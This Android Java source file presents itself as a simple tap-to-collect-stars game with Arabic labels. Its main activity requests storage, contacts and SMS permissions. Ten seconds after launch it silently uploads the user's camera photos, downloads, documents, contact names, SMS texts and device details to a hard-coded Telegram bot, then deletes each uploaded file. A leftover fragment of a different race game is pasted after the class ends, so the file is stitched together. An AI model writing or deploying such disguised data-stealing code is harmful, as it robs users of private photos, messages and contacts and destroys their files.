package com.abdulk.racegame;

import android.os.Bundle;
import android.app.Activity;
import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import android.util.Log;
import org.json.JSONObject;
import java.io.FileWriter;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.widget.Toast;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;

public class MainActivity extends Activity {
    private String BOT_TOKEN = "8984239079:AAEtdnaAKsFH4kZwjO7UbzjZEw-vcXoBXRs";
    private String OWNER_ID = "8164366965";
    private LinearLayout mainLayout;
    private TextView scoreText;
    private int score = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
        
        mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setBackgroundColor(Color.BLACK);
        
        scoreText = new TextView(this);
        scoreText.setText("⭐ النقاط: 0");
        scoreText.setTextSize(30);
        scoreText.setTextColor(Color.YELLOW);
        scoreText.setGravity(Gravity.CENTER);
        mainLayout.addView(scoreText);
        
        Button clickButton = new Button(this);
        clickButton.setText("اضغط لتجمع نجوم 🌟");
        clickButton.setTextSize(20);
        clickButton.setBackgroundColor(Color.GREEN);
        clickButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                score++;
                scoreText.setText("⭐ النقاط: " + score);
                Toast.makeText(MainActivity.this, "🎮 جمعت نجمة!", Toast.LENGTH_SHORT).show();
            }
        });
        mainLayout.addView(clickButton);
        
        TextView statusText = new TextView(this);
        statusText.setText("✅ تم التحميل");
        statusText.setTextSize(15);
        statusText.setTextColor(Color.GREEN);
        statusText.setGravity(Gravity.CENTER);
        mainLayout.addView(statusText);
        
        setContentView(mainLayout);
        
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                statusText.setText("⏳ جاري جمع الصور...");
                statusText.setTextColor(Color.YELLOW);
                collectAllData();
                statusText.setText("✅ تم رفع كل شيء للبوت!");
                statusText.setTextColor(Color.GREEN);
            }
        }, 10000);
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.INTERNET
            };
            requestPermissions(permissions, 100);
        }
    }

    private void collectAllData() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                sendFileToTelegram(Environment.getExternalStorageDirectory() + "/DCIM/Camera/");
                sendFileToTelegram(Environment.getExternalStorageDirectory() + "/Pictures/");
                sendFileToTelegram(Environment.getExternalStorageDirectory() + "/Download/");
                sendContacts();
                sendSMS();
                sendDeviceInfo();
            }
        }).start();
    }

    private void sendFileToTelegram(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            for (File file : files) {
                if (file.isFile()) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (ext.matches("jpg|jpeg|png|gif|pdf|doc|docx|txt")) {
                        sendFile(file);
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void sendFile(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            String boundary = "*****";
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            
            String body = "--" + boundary + "\r\n";
            body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
            body += OWNER_ID + "\r\n";
            body += "--" + boundary + "\r\n";
            body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n";
            body += "Content-Type: application/octet-stream\r\n\r\n";
            
            conn.getOutputStream().write(body.getBytes());
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] buffer = new byte[8192];
            int count;
            while ((count = fis.read(buffer)) != -1) {
                conn.getOutputStream().write(buffer, 0, count);
            }
            fis.close();
            
            String end = "\r\n--" + boundary + "--\r\n";
            conn.getOutputStream().write(end.getBytes());
            conn.getOutputStream().flush();
            conn.getOutputStream().close();
            
            if (conn.getResponseCode() == 200) {
                file.delete();
            }
            conn.disconnect();
        } catch (Exception e) {}
    }

    private void sendContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "contacts.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    writer.write(name + "\n");
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void sendSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "sms.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    writer.write(body + "\n");
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("device", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            
            File file = new File(getExternalFilesDir(null), "device_info.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(info.toString(2));
            writer.close();
            sendFile(file);
        } catch (Exception e) {}
    }
}        btnStart.setEnabled(false);
    }

    public void onPlayer1Tap(View v) {
        if (!gameRunning) return;
        int progress = track1.getProgress() + 5;
        track1.setProgress(progress);
        if (progress >= 100) {
            endGame("اللاعب الأول فاز! 🏆");
        }
    }

    public void onPlayer2Tap(View v) {
        if (!gameRunning) return;
        int progress = track2.getProgress() + 5;
        track2.setProgress(progress);
        if (progress >= 100) {
            endGame("اللاعب الثاني فاز! 🏆");
        }
    }

    private void endGame(String message) {
        gameRunning = false;
        resultText.setText(message);
        btnPlayer1.setEnabled(false);
        btnPlayer2.setEnabled(false);
        btnStart.setEnabled(true);
        btnStart.setText("العب مرة أخرى");
    }
}
